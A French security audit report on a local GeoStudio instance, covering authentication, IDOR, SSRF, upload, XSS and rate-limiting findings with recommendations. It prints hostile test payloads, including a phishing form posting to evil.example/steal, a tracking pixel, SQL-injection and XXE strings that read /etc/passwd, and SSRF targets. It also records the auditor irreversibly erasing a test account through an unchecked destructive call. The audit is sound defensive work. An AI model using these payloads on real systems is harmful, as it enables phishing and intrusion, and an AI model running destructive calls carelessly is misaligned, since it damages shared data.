# Parcours persona : Auditeur sécurité (stack réelle locale, OIDC Keycloak)

Date : 2026-10-16, HEAD `c0251b66`. Instance locale uniquement. Aucun fichier source édité, rien commité, pas de `postgis-test`, pas de suite de tests. Captures : `docs/revue/audit-2026-10-16/parcours/auditeur-securite/*.png`.

## 0. Conditions de test et incident à lire d'abord

- Comptes : seuls `alice` et `bob` (mot de passe du realm, `deploy/keycloak/geostudio-realm.json`) étaient exploitables, **tous deux rôle Créateur**. Les comptes `audit-admin/creator/analyst/reader` existent en base mais je n'en ai pas les mots de passe. Donc : pas de test Lecteur ni Administrateur réel, et l'escalade « entre rôles » n'est testée que de Créateur vers privilèges admin.
- Tokens obtenus par grant `password` sur le client `geostudio-shell` (Keycloak :8180). API cœur :8200, shell :8300. Navigateur : Chromium Playwright du `shell/node_modules` (le Chrome système des MCP est absent), avec en-têtes CORS ajoutés côté client (`page.route`) et le jeton d'alice substitué au jeton mock du shell (le shell tourne en `VITE_AUTH_MODE=mock`, cf. baseline).
- **Les images en cours d'exécution datent du 2026-10-11** (`docker images`, `docker exec geostudio-core-1 grep -c ITEMS_PUBLISH /app/app/items/service.py` renvoie 0), donc **antérieures à plusieurs correctifs de HEAD** (ARC-07/REV-335, REV-349/350/351). Les constats « live » portent sur ces images ; chaque constat dit s'il est confirmé dans le code de HEAD.
- **INCIDENT CAUSÉ PAR MOI (à corriger par le propriétaire)** : en testant `POST /v1/compliance/users/{id}/erase`, j'ai envoyé l'appel avec le jeton de `bob` sur son propre id, croyant tester un refus. Un Créateur n'a besoin d'aucun privilège pour effacer son propre compte : le compte `bob` est donc **anonymisé de façon irréversible** (`users.username = utilisateur-efface-9cd42cf1`, `erased_at` posé, ses `group_members` et notifications supprimés). Toute requête avec son jeton renvoie désormais `403 this account has been erased` (`core/app/users/repository.py:48-49`). J'ai tenté de restaurer la ligne par un `UPDATE` SQL : refusé par le classificateur de permissions, je n'ai pas contourné. Les autres parcours d'audit qui utilisaient `bob` (ex. `analyste-sig.md`) ne peuvent plus le faire. Restauration manuelle possible : `UPDATE users SET username='bob', oidc_sub='712ad509-2e92-4fec-97dc-07081a940d70', erased_at=NULL, email='bob@example.com' WHERE id='9cd42cf1732a4c21bbd12d7e2f9167a7'` puis ré-ajout au groupe « Equipe SIG audit ». Les actions suivantes ont toutes été faites avec `alice`.
- Données de test créées sur l'instance (toutes préfixées `SEC`) : items `9e6ebea187744eefa0f2d5088f6520fa` (app privée) et `19740dd70abc4dd1a534b292704f4631` (app publiée « SEC-XSS public »), 3 icônes `SEC-*`, ~14 secrets `sec-*` (dont `sec-pg`), jobs d'import `SEC nasty*.csv`/`SEC *.kml`, un lien de partage 24 h.

## 1. Chronologie et notes

| Étape | Durée | Note /10 | Résumé |
|---|---|---|---|
| 1. Authentification (JWT forgés : `alg=none`, HS256 deviné, `sub` altéré, expiré, `gsk_` bidon) | ~5 min, 15 ms/req | 9 | Cinq forgeries refusées en 401. Séparation d'audience MCP vérifiée. |
| 2. Escalade rôles / privilèges | ~6 min | 7 | Routes admin refusées 403. Mais effacement de compte sans garde-fou (F1) et publication sans `items.publish` sur l'image live (F7). |
| 3. Cloisonnement inter-utilisateurs / inter-tenants | ~8 min | 8 | 404 uniforme (aucun oracle d'existence), facettes cohérentes. Inter-tenants non testable : tenant unique par conception (F6). |
| 4. SSRF | ~10 min, 180 ms/req | 9 | 22 variantes d'encodage/hôte bloquées. Gardes dupliquées 9 fois (F9). |
| 5. Upload piégé | ~10 min | 6 | XXE/entités neutralisés, SVG assaini, formules CSV neutralisées ; mais fuite de SQL interne dans les erreurs d'import (F2) et nom de fichier non assaini dans la clé S3 (F5). |
| 6. XSS popups/gabarits/widgets | ~12 min, page en 1,8 s, LCP 0,50 s | 5 | Aucune exécution de script, mais HTML actif non-script conservé : formulaire de hameçonnage, `<style>` global, pixel espion (F3). |
| 7. Fuite via MCP / STAC / tuiles / masquage | ~10 min | 9 | Masquage de colonne appliqué partout où j'ai sondé (items, filtre, tri, agrégat, tuiles MVT, STAC, DCAT, profil). |
| 8. Limites et durcissement HTTP | ~5 min | 5 | Contournement du rate-limit par `X-Forwarded-For` sur le port 8200 publié (F4) ; en-têtes de sécurité absents des ports directs (F8). |

Note globale : 7,4 / 10. Aucun blocage de niveau Critique. Les risques réels sont le contenu HTML actif dans les gabarits (F3) et l'effacement de compte sans re-confirmation (F1).

## 2. Blocages (classés)

1. **F3** : un auteur peut injecter un formulaire de hameçonnage, une feuille de style globale et un pixel de pistage dans toute vue publiée ou toute popup (confirmé dans le navigateur).
2. **F1** : n'importe quel porteur de jeton (y compris une clé d'API `gsk_` qui résout vers son créateur, `auth/dependency.py:212`) efface définitivement le compte de son propriétaire en un appel, sans ré-authentification ni confirmation. J'en ai fait l'expérience.
3. **F2** : l'erreur brute d'un job d'ingestion (DDL SQL, noms de tables, paramètres) est renvoyée à l'utilisateur.
4. **F4** : budgets de limitation par IP contournables quand le cœur est joignable directement.

## 3. Constats détaillés

### F1. Effacement de compte (RGPD Art. 17) sans garde-fou : un appel, irréversible (Moyen)
- `core/app/compliance/routes.py:37-51` : `target_id = user.id if user_id == "me" else user_id` ; seul le cas « autre utilisateur » exige `admin.users.manage`. Aucun mot de passe/step-up, aucune confirmation, aucun délai de grâce. `anonymize_user` (`core/app/compliance/service.py:77-99`) change `oidc_sub` en tombstone (`users/repository.py:15-20`) : le compte ne peut plus jamais se reconnecter (`repository.py:43-49`).
- Preuve live : `POST /v1/compliance/users/<id de bob>/erase` avec le jeton de bob → `204` (0,04 s) ; requêtes suivantes `403 this account has been erased`. L'exposition passe aussi par une clé d'API de service : `get_current_user` la résout vers son créateur (`auth/dependency.py:211-216`), donc une clé `gsk_` volée suffit à détruire le compte du créateur.
- Recommandation : exiger une confirmation (corps `{confirm: username}`) et, idéalement, un jeton récent (`auth_time`) ; refuser l'appel depuis une clé d'API.

### F2. Les erreurs internes d'ingestion fuient SQL et schéma à l'utilisateur (Moyen)
- `core/app/ingestion/tasks.py:223-242` : `error_message=f"erreur interne : {exc}"` et la même chaîne dans la notification, lues via `GET /v1/uploads/{job}` (`errorMessage`).
- Preuve live (CSV avec colonnes `id`/`geom`/`tenant_id`) : `erreur interne : (psycopg.errors.DuplicateColumn) column "id" specified more than once [SQL: CREATE TABLE public.ingest_882fc3264009 (id serial PRIMARY KEY, tenant_id text NOT NULL, "nom""; DROP TABLE users;--" text, ... )]`. Second cas : `A value is required for bind parameter 'nom' [SQL: INSERT INTO public.ingest_f61b700d5414 ...]` (ce second défaut est REV-349, déjà corrigé à HEAD ; la fuite, elle, est toujours présente à HEAD).
- Bonne nouvelle associée : les identifiants hostiles sont correctement échappés (`"nom""; DROP TABLE users;--"` reste un nom de colonne). Aucune injection obtenue.
- Recommandation : message générique côté utilisateur, `logger.exception` conserve le détail (déjà fait ligne 224).

### F3. DOMPurify par défaut : HTML actif non-script conservé dans `richSection`, popups et gabarits (Moyen à Élevé, selon l'audience)
- `shell/src/builder/widgets/sanitizeMarkdown.ts:11` : `DOMPurify.sanitize(html)` sans configuration. Mêmes appels pour les popups (`shell/src/map/popupTemplate.ts:101`, injecté via `dangerouslySetInnerHTML` en `shell/src/map/MapPopup.tsx:115`) et `richSection.tsx:43-47`.
- Preuve (navigateur, app publiée `19740dd7…`, capture `03-xss-richsection.png`, script `xss.mjs`) : aucun `__xss*` exécuté, aucun dialogue, `onerror/onload` supprimés, liens `javascript:` supprimés, `<iframe>` supprimé. **Mais** : `<form action="https://evil.example/steal"><input type=password>` est rendu (`#phish`, `formAction` conservée) ; `<style>` conservé : `h1` passe en rouge `!important` et un `body::before` « FAKE BANNER » `position:fixed; z-index:99999` s'affiche ; `<img src="https://evil.example/track.png?viewer=1">` déclenche une requête sortante réelle (observée dans les requêtes réseau).
- Le vecteur s'étend aux **valeurs de données** : les popups interpolent `${...}` avant `sanitizeMarkdown` (`popupTemplate.ts:78-101`), donc une cellule d'un fichier importé par un contributeur est une charge utile pour tout lecteur de la carte.
- Limite de la preuve : vue publique anonyme non rejouée, le shell en mode mock tombe en 401 sans jeton ; constaté avec un jeton authentifié, même composant.
- Hero : `title` rendu en texte brut (`<img …>` affiché littéralement), `ctaHref` protégé par `isSafeHref` (`hero.tsx:10-19`) : sain.
- Recommandation : `DOMPurify.sanitize(html, { FORBID_TAGS: ['style','form','input','button','textarea','select'], FORBID_ATTR: ['style'] })` et bloquer les `<img>` externes (ou proxy), tests de falsification dans `sanitizeMarkdown.test.ts`.

### F4. Le budget de limitation par IP se contourne avec `X-Forwarded-For` quand le cœur est joignable directement (Moyen en local/dev, Faible derrière Traefik seul)
- `core/app/main.py:607` : `ProxyHeadersMiddleware(trusted_hosts=trusted_proxy_hosts())` ; l'env du conteneur (`CORE_TRUSTED_PROXIES=127.0.0.1,::1,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,fc00::/7`) inclut toute la plage Docker. `docker-compose.yml:450` publie `8200:8200` sur l'hôte : le pair vu par uvicorn est la passerelle du pont Docker (RFC 1918, donc « de confiance »).
- Preuve live : `GET /v1/share-links/zz*` ×80 sans en-tête → 18×401 puis 62×429 ; avec `X-Forwarded-For: 8.8.x.y` variable → **80×401, 0×429**, alors que l'IP réelle était déjà limitée (`sans XFF: 429`). La clé du budget share-link est `share:{client_host}` (`ratelimit/limiter.py:105-107`).
- Recommandation : ne pas publier `8200` hors profil dev, ou resserrer `CORE_TRUSTED_PROXIES` à l'IP de Traefik.

### F5. Nom de fichier non assaini dans la clé S3 d'import (Faible)
- `core/app/ingestion/routes.py:90` : `key = f"{user.tenant_id}/{uuid.uuid4().hex}-{body.filename}"`. Les pièces jointes assainissent (`attachments/routes.py:81-95, 191`), pas l'import. Preuve live : `filename="../../x.csv"` → clé `default/8479…-../../x.csv`, URL présignée émise. Pas de traversée S3 (clé littérale), mais `.exe`, `\0`, `/` passent.
- Aussi `ingestion/routes.py:104` et `:211` : la clé fournie par le client n'est validée que par `startswith("{tenant}/")`, donc n'importe quel objet du tenant dans le bucket est référençable (les clés sont des UUID, pas d'exploitation observée). Comparer avec le raster : `raster/routes.py:129` impose la forme `{tenant}/{hex32}/{nom}`.

### F6. Le cloisonnement inter-tenants repose sur un tenant unique, non sur une résolution par jeton (Info)
- `core/app/auth/dependency.py:205` : `tenant = get_or_create_default_tenant(session)` pour **toutes** les requêtes ; aucun claim de tenant lu dans le jeton. Il n'existe donc pas de chemin HTTP pour tester une escalade inter-tenants sur cette instance. L'isolation par `tenant_id` en base (requêtes filtrées, p. ex. `compliance/routes.py:54-58`) n'est pas exerçable de bout en bout. À garder à l'esprit si le multi-tenant est annoncé : aucun test d'intégration réel ne peut le prouver.

### F7. Publication publique sans `items.publish` sur l'image en cours (Moyen live, corrigé à HEAD)
- Live : `alice` (Créateur, privilèges sans `items.publish`) fait `PATCH /v1/items/<id> {"isPublished":true}` → `200`, puis `GET /v1/public/configs/by-item/<id>` anonyme → `200`. La même chose passe par `PUT /sharing {"public":true}` → `204`.
- Code HEAD : `core/app/items/service.py:35-42` (`require_publish_rights` exige `can(share)` et `items.publish`), appelé en `service.py:113` et `:185`. Donc corrigé à HEAD, pas sur la stack servie : le piège « image périmée » transforme un correctif livré en trou ouvert pour qui teste l'instance locale.

### F8. En-têtes de sécurité absents des ports directs (Faible)
- `curl -I :8300` : `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` présents, **pas** de `Content-Security-Policy`, `X-Frame-Options` ni `frame-ancestors` (ils sont posés par Traefik, `core/app/security/traefik_render.py`). Les réponses du cœur sur :8200 n'ont ni `nosniff` ni CORS (aucune origine tierce autorisée : bon). Traefik sur `:80` renvoie 404 sans `Host` valide, je n'ai donc pas pu mesurer les en-têtes de production localement.

### F9. Neuf copies de la garde d'egress, aucune rupture constatée (Info, constat positif et dette)
- `alerts/egress.py`, `copilot/egress.py`, `geocoding/egress.py`, `harvest/egress.py`, `pipelines/egress.py`, `search/egress.py`, `routing/client.py`, plus `net_pin.py` (justifié par le contrat de couches, `net_pin.py:1-10`). `webhooks/delivery.py:19,55` réutilise la session gardée des alertes. Les appels `httpx.get` vers TiTiler (`raster/routes.py:242`, `terrain3d/routes.py:176`) visent une URL interne fixe, paramètres validés (`_RENDER_PARAMS`).
- Preuve live (reader.connector.rest via aperçu de pipeline, secret lié à `baseUrl`) : bloqués `169.254.169.254`, `localhost`, `minio`, `postgis` (DSN), `2130706433`, `0x7f.1`, `127.1`, `0`, `[::1]`, `[::ffff:127.0.0.1]`, `localtest.me` (DNS vers 127.0.0.1), `100.64.0.1`, `192.168.1.1`, `metadata.google.internal` ; `path` absolu ou `@host` refusé par la portée du secret (`outside the base URL scope`). La création de secret accepte des `baseUrl` internes (201) : le contrôle n'a lieu qu'à l'usage, pas à l'écriture, ce qui est sûr mais tardif pour l'utilisateur.

## 4. Ce qui tient (preuves positives)

- Forgeries JWT : `alg=none`, HS256 signé `secret`, `sub` altéré (signature d'origine), `exp` passé, `gsk_abc` : 401 chacune. Un jeton HS256 est routé vers le décodeur de jeton d'export (`auth/dependency.py:230`, `export_tokens.py:57`) qui exige un secret de 44 car. : 401 `invalid export token`.
- Audience MCP : le jeton du shell est refusé sur `/mcp` (401 `invalid_token`) ; `mcp/auth.py:21-48` vérifie `CORE_MCP_AUDIENCE` distinct.
- IDOR : item/config/révisions/sharing/miniature/share-links d'alice → 404 pour un autre porteur, mêmes réponses qu'un id inexistant (pas d'oracle). Collection privée `ingest_08f8cc567150` (250 lignes, autre propriétaire) : items, fid, schema, sharing, profile, tuiles MVT, aggregate, STAC, DCAT, pipeline `reader.collection` : tous 404/400 « not found », `geo-limits` 403.
- Masquage de colonne (GAP-22) sur `query_c6cc0fcec44a` (champ `secret`=`TOPSECRET-42` en base) : absent des items (authentifié et anonyme), du schéma, du profil, des tuiles MVT, de STAC ; filtrer, trier, agréger ou grouper sur `secret` renvoie `unknown field/filter` (aucun oracle booléen).
- DuckDB du pipeline (`transform.derive`, SQL libre) : `read_text('/etc/passwd')`, `glob('/*')`, `read_csv('http://169.254…')` → « file system operations are disabled by configuration » ; `getenv` inexistante.
- SVG des icônes : entité `<!ENTITY>` refusée ; `onload`, `<script>`, `<style>@import`, `javascript:`, `<use href externe>`, `<set>`, `<animate>`, XHTML étranger tous retirés, le fichier servi ne contient que `<rect>` (`content-disposition: attachment`, `nosniff`).
- KML avec XXE (`file:///etc/passwd`, `http://169.254…`) et « billion laughs » : `fichier illisible` (defusedxml, `ingestion/parsers.py:22,806`) ; aucune lecture, aucune requête sortante.
- Export CSV : neutralisation des formules `= + - @` (`cell_safety.py:7,16`, `analytics/export.py:170-171`).
- SQL : valeur `x' OR '1'='1` → 0 résultat ; `groupBy`/`field` avec guillemets et parenthèses → `unknown_field` ; `bbox=1,2,3,4);select 1` → 400 ; `z=99` → 400 ; `limit=999999999` plafonné ; `collections/users/items` et `pg_catalog.pg_user` → 404.
- Liens de partage : jeton JWT signé, aucun élargissement vers une autre ressource (`X-Share-Token` sur autre item : 404 ; en `Authorization` : 401), budget 60/min par IP effectif sans XFF (62×429/80).
- Lecteur d'écran/contrôle d'accès UI : `/admin/users` et `/admin/roles` affichent « Accès réservé à la gestion des utilisateurs. » (capture `04-admin-users-gate.png`), cohérent avec le 403 serveur.

## 5. Console, réseau, a11y, performance

- LCP (Chromium headless, 1280x900) : `/admin/users` 0,26 s, `/admin/roles` 0,18 s, catalogue 0,49 s, app publiée 0,50 s ; chargement jusqu'à `networkidle` 1,7 à 1,8 s. Latences API : 4 à 30 ms ; STAC anonyme `GET /v1/stac/collections` 2,3 s et DCAT `GET /v1/dcat/catalog` 1,7 s (lentes, non authentifiées, scan de toutes les collections : vecteur de lenteur à surveiller).
- Console : seules erreurs = CORS (artefact de l'environnement) puis 401 en mode mock sans jeton, et `ERR_NAME_NOT_RESOLVED` pour le pixel espion (preuve de F3).
- A11y : `/apps/<id>` (runtime) n'a pas de repère `<main>` (`main: false`, `h1` « Test XSS » présent) alors que le catalogue et les pages d'admin en ont un ; l'image servie est antérieure au correctif annoncé. Pas d'axe-core exécuté dans ce parcours.

## 6. Frictions de l'auditeur

- Aucune page ni commande ne documente quels comptes de test existent ni leurs mots de passe ; j'ai dû déduire `alice`/`bob` du realm, et les comptes `audit-*` semés sont inutilisables sans les secrets.
- Pas d'environnement multi-tenant ni de compte Administrateur/Lecteur prêt : l'audit « entre rôles » est incomplet.
- `docker compose` ne reconstruit pas les images après les commits : un auditeur teste du code périmé sans le savoir (F7).
- Une opération destructrice et sans confirmation (`erase`) est à un `curl` de distance : c'est F1 vécu.

## 7. Non fait / limites

- Pas testés : alertes (webhook SMTP/HTTP), `/v1/embed` de bout en bout, WMS/WFS, MCP authentifié (pas de jeton à l'audience `geostudio-mcp`), moissonnage (`admin.harvest.manage`), extensions (`admin.extensions`), Keycloak (brute force, redirect_uri), upload GPKG/Shapefile zippé piégé (zip bomb, traversée), concurrence/TOCTOU DNS (rebinding réel).
- XSS en vue anonyme réelle non rejoué (voir F3). Pas de test sur un deuxième tenant (voir F6).
